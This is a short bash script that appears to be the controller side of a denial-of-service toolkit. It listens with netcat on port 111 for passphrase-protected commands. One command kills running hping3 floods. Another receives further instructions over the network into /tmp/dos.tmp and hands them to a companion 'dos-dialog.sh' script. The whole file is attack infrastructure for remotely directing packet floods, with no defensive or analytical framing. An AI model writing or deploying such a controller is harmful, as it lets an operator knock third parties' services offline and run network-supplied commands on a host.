#!/bin/bash
DEFAULT_PORT[1]=111
SCRIPT_NAME=~/dos-dialog.sh
#Change this
PASSPHRASE=default
while true; do
NC_PACKET[1]=`nc -l ${DEFAULT_PORT[1]} -v`
if [ "${NC_PACKET[1]}" = "stop hping3 ${PASSPHRASE}" ]; then
    killall hping3
    echo "Received kill signal."
elif [ "${NC_PACKET[1]}" = "listen start ${PASSPHRASE}" ]; then
    nc -l ${DEFAULT_PORT[1]} > /tmp/dos.tmp
    ${SCRIPT_NAME} History /tmp/dos.tmp &
else
    echo ${NC_PACKET[1]}
    echo "Either got wrong passphrase or bad syntax."
fi
done